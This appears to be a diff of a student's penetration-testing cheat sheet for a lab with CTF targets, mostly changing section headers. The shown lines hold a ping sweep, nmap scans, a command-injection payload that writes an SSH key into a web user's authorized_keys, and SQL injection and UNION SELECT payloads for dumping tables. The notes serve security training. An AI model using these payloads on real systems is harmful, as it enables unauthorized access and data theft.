@@ -16,7 +16,7 @@ http://10.50.143.84:8000 ----------> CTF Challenges
   ---RAPIDLY SCAN HOSTS IN A NETWORK---
 for i in {1..255}; do (ping -c 1 10.50.12.$i | grep "bytes from" &); done
 
------------------------------------------PORT DISCOVERY---------------------------------------------
+--------------------------------------###PORT DISCOVERY###------------------------------------------
  nmap -p 53 --script dns* 10.50.12.22-24
 
 nmap -p 80 --script http-enum 10.50.12.22-24
@@ -130,13 +130,13 @@ cat /home/student/.ssh/id_rsa.pub
 ## One Target, upload key and verify
 ; echo "" > /var/www/.ssh/authorized_keys # Paste whole key into echo
 ; cat /var/www/.ssh/authorized_keys
-----------------------------------------------------------------------------------------------------------------------
-### SQL INJECTION ###
+------------------------------------------------### SQL INJECTION ###---------------------------------------------------------
 User enters tom' OR 1='1 in the name and pass fields.
 Truth Statement: tom ' OR 1='1
-Server-Side query executed would appear like this:
-SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
-    ### POST METHOD ###
+    Server-Side query executed would appear like this:
+      SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
+
+### POST METHOD ###
 ## STEP 1
 # Use to check if field is vulnerable / no sanitization   
 | <value> 'OR 1=1' | 
@@ -150,7 +150,7 @@ SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
 | <value>' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; # |
 
 ## STEP 4
-#
+# Selecting different tables and columns
 | <value>' UNION SELECT tireid,2,size,cost,5 FROM session.Tires # | 
 
     ### GET METHOD ###
@@ -366,7 +366,7 @@ File-Type: .evtx/.evt
 wevtutil el
 wmic ntevent where "logfile="<LOGNAME>" list full
 Get-Eventlog -List
---------------------------------------------------------------------------
+-----------------------### PRIVILEGE ESCALATION ###---------------------------
 ##SUDO##
 sudo -l 
 
